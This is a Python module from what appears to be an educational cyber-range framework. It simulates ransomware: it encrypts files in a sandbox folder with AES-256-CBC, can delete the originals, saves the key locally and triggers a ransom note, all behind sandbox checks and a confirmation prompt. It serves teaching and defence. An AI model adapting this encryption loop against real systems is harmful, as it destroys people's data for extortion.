"""
CyberSim6 - Ransomware Encryptor
AES-256-CBC encryption of files in sandbox only.
EDUCATIONAL PURPOSE ONLY - Never use outside sandbox.
"""

import hashlib
import json
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

from cybersim.core.base_module import BaseModule
from cybersim.core.safety import validate_sandbox_directory
from cybersim.ransomware.safety_guard import RansomwareSafetyGuard


class RansomwareSimulator(BaseModule):
    """Simulates ransomware encryption in a sandboxed environment."""

    MODULE_TYPE = "attack"
    MODULE_NAME = "ransomware_encrypt"

    def __init__(self, config: dict, logger):
        self._guard = None
        super().__init__(config, logger)

    def _validate_safety(self):
        sandbox_dir = self.config.get("sandbox_dir", "./sandbox/test_files")
        validate_sandbox_directory(Path(sandbox_dir))

    def run(self, sandbox_dir: str = None, confirm: bool = True, **kwargs):
        """
        Encrypt files in the sandbox directory.

        Args:
            sandbox_dir: Path to sandbox directory
            confirm: If True, ask for confirmation before encrypting
        """
        sandbox_dir = Path(sandbox_dir or self.config.get("sandbox_dir", "./sandbox/test_files"))
        encrypted_ext = self.config.get("encrypted_extension", ".locked")
        keep_originals = self.config.get("keep_originals", True)
        allowed_ext = self.config.get("file_extensions", [".txt", ".csv", ".doc", ".pdf"])
        max_files = self.config.get("max_files", 50)

        # Initialize safety guard
        self._guard = RansomwareSafetyGuard(
            sandbox_dir=sandbox_dir,
            max_files=max_files,
            allowed_extensions=allowed_ext,
        )

        # Collect target files
        target_files = []
        for ext in allowed_ext:
            target_files.extend(sandbox_dir.glob(f"*{ext}"))

        if not target_files:
            self.log_event("no_targets", {
                "message": "No target files found in sandbox.",
                "status": "info",
            })
            return

        # Atomic pre-check
        self._guard.pre_run_check(target_files)

        # Confirmation prompt
        if confirm:
            print("\n" + "=" * 60)
            print("  [!] CyberSim6 - RANSOMWARE SIMULATION")
            print("  [!] EDUCATIONAL PURPOSE ONLY")
            print("=" * 60)
            print(f"  Sandbox: {sandbox_dir.resolve()}")
            print(f"  Files to encrypt: {len(target_files)}")
            print(f"  Keep originals: {keep_originals}")
            for f in target_files:
                print(f"    - {f.name}")
            print("=" * 60)
            response = input("  Type 'YES' to proceed: ").strip()
            if response != "YES":
                self.log_event("cancelled", {
                    "message": "Encryption cancelled by user.",
                    "status": "info",
                })
                return

        self._running = True

        # Generate AES-256 key
        key = get_random_bytes(32)
        iv = get_random_bytes(16)

        self.log_event("attack_started", {
            "message": f"Ransomware encryption started ({len(target_files)} files)",
            "target": str(sandbox_dir),
            "file_count": len(target_files),
            "status": "warning",
        })

        # Track checksums for integrity verification
        manifest = {
            "session": self.logger.session_id,
            "sandbox": str(sandbox_dir.resolve()),
            "files": [],
        }

        encrypted_count = 0
        for filepath in target_files:
            if not self._running:
                break

            try:
                # Read original content
                original_data = filepath.read_bytes()
                original_hash = hashlib.sha256(original_data).hexdigest()

                # Encrypt with AES-256-CBC
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted_data = cipher.encrypt(pad(original_data, AES.block_size))

                # Write encrypted file
                encrypted_path = filepath.with_suffix(filepath.suffix + encrypted_ext)
                encrypted_path.write_bytes(encrypted_data)

                # Record in manifest
                manifest["files"].append({
                    "original_name": filepath.name,
                    "encrypted_name": encrypted_path.name,
                    "original_hash": original_hash,
                    "original_size": len(original_data),
                })

                self._guard.record_encryption()
                encrypted_count += 1

                self.log_event("file_encrypted", {
                    "message": f"Encrypted: {filepath.name} -> {encrypted_path.name}",
                    "original_file": filepath.name,
                    "encrypted_file": encrypted_path.name,
                    "original_hash": original_hash,
                    "status": "info",
                })

                # Optionally remove original
                if not keep_originals:
                    filepath.unlink()

            except Exception as e:
                self.log_event("error", {
                    "message": f"Failed to encrypt {filepath.name}: {e}",
                    "status": "error",
                })

        # Save key file (in sandbox)
        key_path = sandbox_dir / "decryption.key"
        key_data = {
            "key": key.hex(),
            "iv": iv.hex(),
            "algorithm": "AES-256-CBC",
        }
        key_path.write_text(json.dumps(key_data, indent=2))

        # Save manifest
        manifest_path = sandbox_dir / "encryption_manifest.json"
        manifest_path.write_text(json.dumps(manifest, indent=2))

        self._running = False
        self.log_event("attack_completed", {
            "message": f"Ransomware simulation complete. {encrypted_count} files encrypted.",
            "encrypted_count": encrypted_count,
            "key_file": str(key_path),
            "status": "info",
        })

        # Generate ransom note
        from cybersim.ransomware.ransom_note import generate_ransom_note
        generate_ransom_note(sandbox_dir, encrypted_count)

        return {
            "encrypted_count": encrypted_count,
            "key_file": str(key_path),
            "manifest_file": str(manifest_path),
        }

    def stop(self):
        self._running = False
        self.log_event("attack_stopped", {
            "message": "Ransomware encryption stopped by user.",
            "status": "info",
        })
